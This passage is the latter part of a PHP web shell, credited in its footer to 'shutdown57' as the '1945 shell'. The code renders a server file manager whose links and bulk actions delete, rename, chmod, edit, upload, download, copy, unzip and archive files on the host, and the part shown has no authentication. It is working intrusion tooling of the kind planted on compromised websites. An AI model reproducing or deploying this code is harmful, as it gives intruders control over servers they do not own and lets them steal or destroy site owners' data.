	<--[<a href="?45='.dirname($d).'">..</a>]</td><td>--</td><td>--</td><td>--</td><td>[<a href="?act='.$d.'&upload='.$d.'/'.$dir.'">upload</a>][<a href="?act='.$d.'&mkdir='.$d.'/'.$dir.'">newdir</a>][<a href="?act='.$d.'&newfile='.$d.'/'.$dir.'">newfile</a>]</td></tr>';
foreach ($sdir as $dir) {
	if(!is_dir("$d/$dir")||$dir=='.'||$dir=='..')continue;
	echo'
	
	<tr class="hover">
	<td>'.$no++.'</td><td>
<input type="checkbox" name="cekd[]" value="'.$d.'/'.$dir.'" style="background:transparent;color: #fff;border: 1px solid #fff;">
</td>
	<td style="width:20%;max-width:500px;">'.icon_folder.'
	[<a href="?45='.$d.'/'.$dir.'">'.substr($dir,0,40).'</a>]</td>
	<td>'.perms("$d/$dir").'</td><td>DIR</td><td>'.date('d M Y | H:m',filemtime("$d/$dir")).'</td><td style="width:20%;max-width:400px;">
	[<a href="?act='.$d.'&rmdir='.$d.'/'.$dir.'">delete</a>][<a href="?act='.$d.'&rename='.$d.'/'.$dir.'">rename</a>][<a href="?act='.$d.'&chmod='.$d.'/'.$dir.'">chmod</a>]</td></tr>';
}
foreach ($sdir as $file) {
	if(!is_file("$d/$file"))continue;
	$size = filesize("$d/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
	echo'
	<tr class="hover">
	<td>'.$no++.'</td><td><input type="checkbox" name="cekf[]" value="'.$d.'/'.$file.'"></td><td style="width:20%;max-width:500px;">'.icon_file.'
	-<a href="?act='.$d.'&src='.$d.'/'.$file.'">'.substr($file,0,40).'</a></td>
	<td>'.perms("$d/$file").'</td><td>'.$size.'</td><td>'.date('d M Y | H:m',filemtime("$d/$file")).'</td><td style="width:20%;max-width:400px;">
	[<a href="?act='.$d.'&edit='.$d.'/'.$file.'">edit</a>][<a href="?act='.$d.'&rm='.$d.'/'.$file.'">delete</a>][<a href="?act='.$d.'&rename='.$d.'/'.$file.'">rename</a>][<a href="?act='.$d.'&chmod='.$d.'/'.$file.'">chmod</a>][<a href="?act='.$d.'&download='.$d.'/'.$file.'">Download</a>]</td></tr>';
}

echo'
<tr>
<td colspan="3">
<select name="select">
<option> action selected files</option>
<option value="del">delete</option>
<option value="copy">backUp</option>
<option value="unzip">unzip</option>
<option value="gz">compress .gz</option>
<option value="tar"> compress .tar.gz </option>
</select>
<input type="submit" name="sbmt" value=">>" >
</form></td><td><form method="post">
font size : <input type="number" name="fz" value="'.$fz.'"><input type="submit" name="submitfz" value=">>"></form></td><td><form method="post">
background: <input type="color" name="bgcolor" value="'.$bg.'"><input type="submit" name="submitbg" value=">>"></form></td><td><form method="post">
font color: <input type="color" name="color" value="'.$col.'"><input type="submit" name="submitcol" value=">>"></form></td><td>responsive mode : '.$resmod.' </td></tr>
</table>';

if(isset($_POST['sbmt'])){
	$file=$_POST['cekf'];
	$dir=$_POST['cekd'];
	if($_POST['select']=='del'){
		if($_POST['cekf']){
			
			foreach ($file as $cekf) {
				if(unlink($cekf)){
					echo"<meta http-equiv='refresh' content=0;url=>";
				}
			}
		}
	if($_POST['cekd']){
		
		foreach ($dir as $cekd) {
		if(rmdir($cekd)){
			echo"<meta http-equiv='refresh' content=0;url=>";
		}
		}}}elseif($_POST['select']=='copy'){
if($_POST['cekf']){

	foreach ($file as $copy) {
		$copi=basename($copy);
		if(!file_exists("45backUp")){
		@mkdir('45backUp');
	}
		if(copy($copy,"45backUp/".basename($copy))){
			echo"[<font color=lime>OK</font>]--> <a href='?act=".dirname($copy)."/45backUp&src=".dirname($copy)."/45backUp/".basename($copy)."'> ".basename($copy)." </a><br>";
		}else{
			echo "[<font color=grey>FAIL</font>]--> 45backUp/".basename($Copy)."<br>";
		}
	}
}
}elseif ($_POST['select']=='unzip') {
	@mkdir("45extracted");
	foreach ($file as $unzip) {
		$zip = new ZipArchive;
$res = $zip->open($unzip);

if ($res === TRUE) {

$zip->extractTo("45extracted/");

$zip->close();
         echo "[<font color=lime>OK</font>] extracted !<br>";
     } else {

echo "[<font color=grey>FAIL</font>] feiled!";
     }
	}
}elseif($_POST['select']=='gz'){
	if($_POST['cekf']){
		if(!file_exists("45compressed")){
			@mkdir("45compressed");
		}
foreach($file as $gz){
$gzfile = "45compressed/".basename($gz).".gz";
$fp = gzopen($gzfile, 'w9');
if(gzwrite($fp, file_get_contents($gz))){
	echo"[<font color=lime> OK </font>] Compressed !!--> <a href='?45=".dirname($gz)."/45compressed'>here</a>";
}
gzclose($fp);

}
}
}elseif ($_POST['select']=='tar') {
	try
{
    $a = new PharData('45archive.tar');
foreach($file as $tar){
    $a->addFile($tar);
}
    $a->compress(Phar::GZ);
    @unlink('45archive.tar');
} 
catch (Exception $e) 
{
    echo "Exception : " . $e;
}
}
}
}
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<div style="font-size:11px;position:fixed;bottom:0;left:0;">
copyright &copy; <?php echo date('Y');?> | 1945 shell by : shutdown57 | <a href="http://www.withoutshadow.org"> www.withoutshadow.org</a>
</div>
</body>
</html>
